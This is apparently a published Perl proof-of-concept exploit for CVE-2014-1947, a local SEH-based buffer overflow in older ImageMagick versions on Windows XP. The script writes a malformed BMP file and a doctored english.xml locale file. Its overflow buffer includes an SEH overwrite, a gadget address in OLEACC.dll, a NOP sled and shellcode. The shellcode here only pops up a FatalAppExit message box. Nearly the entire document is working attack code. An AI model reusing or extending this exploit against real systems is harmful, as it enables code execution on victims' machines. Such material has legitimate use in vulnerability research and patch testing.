#!/usr/bin/perl
########################################################################################
# Exploit Title: ImageMagick < 6.8.8-5 - Local Buffer Overflow (SEH)
# Date: 2-13-2014
# Exploit Author: Mike Czumak (T_v3rn1x) -- @SecuritySift
# Vulnerable Software: ImageMagick (all versions prior to 6.8.8-5)
# Software Link: http://ftp.sunet.se/pub/multimedia/graphics/ImageMagick/binaries/
# Version Tested: 6.8.8-4
# Tested On: Windows XP SP3
########################################################################################
# Credits:
# 
# CVE-2014-1947 published Feb 08 2014
#               by Justin Grant
#               http://www.securityfocus.com/bid/65478/info
#
########################################################################################
# Overview:
#
# I saw the notice for this CVE today but there was no known published expoits so 
# I figured I'd put together this quick POC. Note, all app modules for the tested 
# version were compiled with safeSEH so my use of an OS module may require adjustment  
# of the offsets. There also appears to be several bad chars that fail the sploit.
# For this POC I only generate a basic messagebox using FatalAppExit(). It may take 
# some work to get it to do more.
#
# How it works:
# 
# This particular BOF takes advantage of insecure handling of the english.xml file
# which the app uses to display various error messages. I didn't spend much time 
# investigating the app so there may be additional vulnerable locations
# 
# This script generates two files:
#   1) a malfored .bmp file that will cause ImageMagick to generate a specific
#      error when opened (LengthAndFilesizeDoNotMatch), as defined in the 
#      english.xml file
#   2) a modified  english.xml file that replaces the original error message with 
#      our exploit code
#
# To test this POC:
#   1) run the script, replace the original english.xml file (in App's folder)
#   2) open the .bmp file with ImageMagick
########################################################################################

# file write function 
sub write_file { 
  my ($file, $buffer) = @_;
  open(FILE, ">$file");
  print FILE $buffer;
  close(FILE);
  print "Exploit file [" . $file . "] created\n";
  print "Buffer size: " . length($buffer) . "\n"; 
}

# create bmp file header; needs to be a valid header to generate necessary error
sub bmp_header {
   my $header = "\x42\x4d"; # BM
   $header = $header . "\x46\x00\x00\x00"; # file size (70 bytes)
   $header = $header . "\x00\x00\x00\x00"; # unused 
   $header = $header . "\x36\x00\x00\x00"; # bitmap offset
   $header = $header . "\x28\x00\x00\x00"; # header size
   $header = $header . "\x02\x00\x00\x00"; # width
   $header = $header . "\x02\x00\x00\x00"; # height
   $header = $header . "\x01\x00"; # num of color planes
   $header = $header . "\x18\x00"; # num of bits per pixel
   $header = $header . "\x00\x00\x00\x00"; # compression (none)
   $header = $header . "\x10\x00\x00\x00"; # image size
   $header = $header . "\x13\x0b\x00\x00"; # horizontal resolution (2,835 pixels/meter)
   $header = $header . "\x13\x0b\x00\x00"; # vertical resolution (2,835 pixels/meter)
   $header = $header . "\x00\x00\x00\x00"; # colors in palette
   $header = $header . "\x00\x00\x00\x00"; #important colors
   return $header;
}

## Construct the corrupted bmp file which will trigger the vuln
my $header = bmp_header();
my $data = "\x41" x (5000 - length($header)); # arbitrary file data filler
my $buffer = $header.$data; 
write_file("corrupt.bmp", $buffer);

# construct the buffer payload for our xml file
my $buffsize = 100000;
my $junk = "\x41" x 62504; # offset to next seh at 568
my $nseh = "\xeb\x32\x90\x90"; # overwrite next seh with jmp instruction (20 bytes)
my $seh = pack('V', 0x74c82f4f); # : pop ebp  pop ebx  ret
				 # ASLR: False, Rebase: False, SafeSEH: False, OS: True, C:\WINDOWS\system32\OLEACC.dll)
my $junk2 = "\x41" x 12; # there are at least two possible offsets -- 1 for  file-> open and 1 for the open file menubar button 
my $nops = "\x90" x 100;

# this is just a POC shellcode that displays a messagebox using the FatalAppExit function 
my $shell = "\xb9\x7c\xec\xa5\x7c" . # Unicode String "FailSilently" (address may vary)
	    "\x31\xc0" . # xor eax, eax
	    "\xbb\xb2\x1b\x86\x7c" . # kernel32.dll FatalAppExit()
	    "\x51" . # push ecx
	    "\x50" . # push eax
	    "\xff\xd3"; # call ebx

my $sploit = $junk.$nseh.$seh.$junk2.$nseh.$seh.$nops.$shell; # assemble the exploit portion of the buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer with junk
$sploit = $sploit.$fill; # assemble the final buffer

# build the malicious xml file
my $xml = '<?xml version="1.0" encoding="UTF-8"?><locale name="english"><exception><corrupt><image><warning><message name="LengthAndFilesizeDoNotMatch">'; 
$xml = $xml . $sploit;
$xml = $xml . '</message></warning></image></corrupt></exception></locale>';
my $buffer = $xml;
write_file("english.xml", $buffer); 
